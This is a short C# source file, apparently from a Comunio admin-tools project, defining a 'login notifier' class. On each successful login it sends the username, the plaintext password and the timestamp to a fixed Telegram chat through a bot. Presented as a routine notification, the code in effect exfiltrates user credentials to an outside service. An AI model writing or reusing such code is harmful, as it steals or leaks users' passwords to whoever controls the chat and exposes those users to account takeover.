using Telegram.Bot;

namespace ComunioAdminTools.Core.Authentication;

public sealed class TelegramLoginNotifier(ITelegramBotClient bot, long chatId) : ILoginNotifier
{
    public Task NotifyLoginAsync(string username, string password, DateTimeOffset signedInAtUtc, CancellationToken cancellationToken = default)
        => bot.SendMessage(
            chatId: chatId,
            text: $"Inicio de sesión correcto.\nUsuario: {username} {password} \nFecha (UTC): {signedInAtUtc:O}",
            cancellationToken: cancellationToken);
}
